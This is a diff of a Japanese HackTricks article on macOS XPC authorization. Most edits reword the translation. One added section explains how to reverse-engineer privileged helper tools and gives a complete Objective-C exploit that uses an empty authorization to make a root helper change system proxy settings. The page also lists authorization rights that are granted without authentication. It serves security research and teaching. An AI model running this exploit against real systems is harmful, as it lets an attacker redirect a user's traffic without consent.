@@ -16,11 +16,11 @@
 
 Appleは、接続プロセスが**公開されたXPCメソッドを呼び出す権限**を持っているかどうかを認証する別の方法も提案しています。
 
-アプリケーションが**特権ユーザーとしてアクションを実行する必要がある**場合、通常は特権ユーザーとしてアプリを実行する代わりに、XPCサービスとしてHelperToolをrootとしてインストールします。ただし、サービスを呼び出すアプリは十分な認証を持っている必要があります。
+アプリケーションが**特権ユーザーとしてアクションを実行する必要がある**場合、通常は特権ユーザーとしてアプリを実行する代わりに、XPCサービスとしてHelperToolをrootとしてインストールします。ただし、サービスを呼び出すアプリには十分な認証が必要です。
 
 ### ShouldAcceptNewConnection は常に YES
 
-[EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample)に例があります。`App/AppDelegate.m`では、**HelperTool**に**接続**しようとします。そして、`HelperTool/HelperTool.m`では、**`shouldAcceptNewConnection`**関数は以前に指定された要件のいずれも**チェックしません**。常にYESを返します：
+[EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample)には、例があります。`App/AppDelegate.m`では、**HelperTool**に**接続**しようとします。そして、`HelperTool/HelperTool.m`では、関数**`shouldAcceptNewConnection`**は、以前に指定された要件のいずれも**チェックしません**。常にYESを返します：
 ```objectivec
 - (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
 // Called by our XPC listener when a new connection comes in.  We configure the connection
@@ -182,7 +182,7 @@ block(authRightName, authRightDefault, authRightDesc);
 }];
 }
 ```
-このプロセスの最後には、`commandInfo`内で宣言された権限が`/var/db/auth.db`に保存されます。各メソッドごとに、**認証が必要な**権限名と**`kCommandKeyAuthRightDefault`**が含まれていることに注意してください。後者は、**この権限を取得できるユーザー**を示しています。
+このプロセスの最後には、`commandInfo`内で宣言された権限が`/var/db/auth.db`に保存されます。各メソッドごとに、**認証が必要な**、**権限名**と**`kCommandKeyAuthRightDefault`**が含まれていることに注意してください。後者は、**この権限を取得できるユーザー**を示します。
 
 権限にアクセスできるユーザーを示すために、さまざまなスコープがあります。それらの一部は[AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity\_authorization/lib/AuthorizationDB.h)で定義されています（[ここですべてを見つけることができます](https://www.dssw.co.uk/reference/authorization-rights/)）。要約すると：
 
@@ -190,7 +190,7 @@ block(authRightName, authRightDefault, authRightDesc);
 
 ### 権限の検証
 
-`HelperTool/HelperTool.m`の関数**`readLicenseKeyAuthorization`**は、呼び出し元が**そのメソッドを実行する権限を持っているかどうか**を確認するために、関数**`checkAuthorization`**を呼び出します。この関数は、呼び出し元プロセスが送信した**authData**が**正しい形式**であるかどうかをチェックし、その後、特定のメソッドを呼び出すために**どの権限が必要か**をチェックします。すべてがうまくいけば、**返される`error`は`nil`**になります。
+`HelperTool/HelperTool.m`の関数**`readLicenseKeyAuthorization`**は、呼び出し元が**そのメソッドを実行する権限を持っているかどうか**を確認するために、**`checkAuthorization`**関数を呼び出します。この関数は、呼び出し元プロセスが送信した**authData**が**正しい形式**であるかをチェックし、その後、特定のメソッドを呼び出すために**どの権限が必要か**をチェックします。すべてがうまくいけば、**返される`error`は`nil`**になります。
 ```objectivec
 - (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
 {
@@ -254,22 +254,22 @@ SELECT name FROM rules WHERE name LIKE '%safari%';
 ```bash
 security authorizationdb read com.apple.safaridriver.allow
 ```
-### 許可権限
+### パーミッションの設定
 
-**すべての許可構成**は[こちら](https://www.dssw.co.uk/reference/authorization-rights/)で見つけることができますが、ユーザーの対話を必要としない組み合わせは次のとおりです：
+**すべてのパーミッションの設定**は[こちら](https://www.dssw.co.uk/reference/authorization-rights/)で見つけることができますが、ユーザーの操作が必要ない組み合わせは以下の通りです：
 
 1. **'authenticate-user': 'false'**
 * これは最も直接的なキーです。`false`に設定されている場合、ユーザーはこの権限を得るために認証を提供する必要はありません。
-* これは、以下の2つのいずれかと組み合わせるか、ユーザーが所属するグループを示すために使用されます。
+* これは、以下の2つのいずれかと組み合わせて使用するか、ユーザーが所属するグループを示すために使用されます。
 
 2. **'allow-root': 'true'**
-* ユーザーがルートユーザーとして操作しており（昇格された権限を持っている）、このキーが`true`に設定されている場合、ルートユーザーは追加の認証なしでこの権限を取得する可能性があります。ただし、通常、ルートユーザーステータスに到達するにはすでに認証が必要なため、ほとんどのユーザーにとってこれは「認証なし」のシナリオではありません。
+* ユーザーがルートユーザーとして操作している場合（昇格された権限を持つユーザー）、このキーが`true`に設定されている場合、ルートユーザーは追加の認証なしでこの権限を取得する可能性があります。ただし、通常、ルートユーザーの状態に到達するにはすでに認証が必要なため、ほとんどのユーザーにとってこれは「認証なし」のシナリオではありません。
 
 3. **'session-owner': 'true'**
-* `true`に設定されている場合、セッションの所有者（現在ログインしているユーザー）は自動的にこの権限を取得します。ユーザーがすでにログインしている場合、これにより追加の認証がバイパスされる場合があります。
+* `true`に設定されている場合、セッションの所有者（現在ログインしているユーザー）は自動的にこの権限を取得します。これにより、ユーザーがすでにログインしている場合、追加の認証がバイパスされる場合があります。
 
 4. **'shared': 'true'**
-* このキーは認証なしで権限を付与するものではありません。代わりに、`true`に設定されている場合、権限が認証されると、各プロセスが再認証する必要なく複数のプロセス間で共有できることを意味します。ただし、権限の最初の付与には認証が必要です。ただし、'authenticate-user': 'false'などの他のキーと組み合わせる場合は除きます。
+* このキーは認証なしで権限を付与するものではありません。代わりに、`true`に設定されている場合、権限が認証された後、複数のプロセス間で共有することができます。ただし、権限の最初の付与には認証が必要です。ただし、'authenticate-user': 'false'などの他のキーと組み合わせる場合は、認証が必要ありません。
 
 興味深い権限を取得するためには、[**このスクリプト**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9)を使用できます。
 ```
@@ -283,12 +283,156 @@ com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek,
 Rights with 'session-owner': 'true':
 authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
 ```
+## 認証の逆向き
+
+### EvenBetterAuthorization の使用を確認する
+
+もし、関数 **`[HelperTool checkAuthorization:command:]`** を見つけた場合、おそらくプロセスは以前に言及した認証のスキーマを使用しています:
+
+<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+この関数が `AuthorizationCreateFromExternalForm`、`authorizationRightForCommand`、`AuthorizationCopyRights`、`AuhtorizationFree` などの関数を呼び出している場合、[**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) を使用しています。
+
+**`/var/db/auth.db`** をチェックして、ユーザーの操作なしに特権アクションを呼び出すための権限を取得できるかどうかを確認します。
+
+### プロトコル通信
+
+次に、XPCサービスとの通信を確立するためにプロトコルスキーマを見つける必要があります。
+
+関数 **`shouldAcceptNewConnection`** はエクスポートされているプロトコルを示しています:
+
+<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+この場合、EvenBetterAuthorizationSample と同じものがあります、[**この行をチェックしてください**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)。
+
+使用されているプロトコルの名前を知ることで、そのヘッダ定義を **ダンプ** することができます。
+```
+class-dump /Library/PrivilegedHelperTools/com.example.HelperTool
+
+[...]
+@protocol HelperToolProtocol
+- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
+- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
+- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
+- (void)getVersionWithReply:(void (^)(NSString *))arg1;
+- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
+@end
+[...]
+```
+最後に、それと通信を確立するために**公開されたMachサービスの名前**を知る必要があります。これを見つけるためのいくつかの方法があります：
+
+* **`[HelperTool init]`**で、使用されているMachサービスが表示されています：
+
+<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+* launchdのplistファイルで：
+```
+cat /Library/LaunchDaemons/com.example.HelperTool.plist
+
+[...]
+
+<key>MachServices</key>
+<dict>
+<key>com.example.HelperTool</key>
+<true/>
+</dict>
+[...]
+```
+### 攻撃例
+
+この例では、以下のことが行われます：
+
+* 関数を持つプロトコルの定義
+* アクセスを要求するために使用する空の認証
+* XPCサービスへの接続
+* 接続が成功した場合に関数を呼び出す
+```
+// gcc -framework Foundation -framework Security expl.m -o expl
+
+#import <Foundation/Foundation.h>
+#import <Security/Security.h>
+
+// Define a unique service name for the XPC helper
+static NSString* XPCServiceName = @"com.example.XPCHelper";
+
+// Define the protocol for the helper tool
+@protocol XPCHelperProtocol
+- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
+- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
+- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
+- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
+- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
+@end
+
+int main(void) {
+NSData *authData;
+OSStatus status;
+AuthorizationExternalForm authForm;
+AuthorizationRef authReference = {0};
+NSString *proxyAddress = @"127.0.0.1";
+NSString *proxyPort = @"4444";
+Boolean isProxyEnabled = true;
+
+// Create an empty authorization reference
+status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
+const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+NSLog(@"OSStatus: %s", errorMsg);
+
+// Convert the authorization reference to an external form
+if (status == errAuthorizationSuccess) {
+status = AuthorizationMakeExternalForm(authReference, &authForm);
+errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+NSLog(@"OSStatus: %s", errorMsg);
+}
+
+// Convert the external form to NSData for transmission
+if (status == errAuthorizationSuccess) {
+authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
+errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+NSLog(@"OSStatus: %s", errorMsg);
+}
+
+// Ensure the authorization was successful
+assert(status == errAuthorizationSuccess);
+
+// Establish an XPC connection
+NSString *serviceName = XPCServiceName;
+NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
+NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
+[xpcConnection setRemoteObjectInterface:xpcInterface];
+[xpcConnection resume];
+
+// Handle errors for the XPC connection
+id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
+NSLog(@"[-] Connection error");
+NSLog(@"[-] Error: %@", error);
+}];
+
+// Log the remote proxy and connection objects
+NSLog(@"Remote Proxy: %@", remoteProxy);
+NSLog(@"XPC Connection: %@", xpcConnection);
+
+// Use the legacy method to configure the proxy
+[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
+NSLog(@"Response: %@", error);
+}];
+
+// Allow some time for the operation to complete
+[NSThread sleepForTimeInterval:10.0f];
+
+NSLog(@"Finished!");
+}
+```
+## 参考文献
+
+* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)
+
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
 * [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 * [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
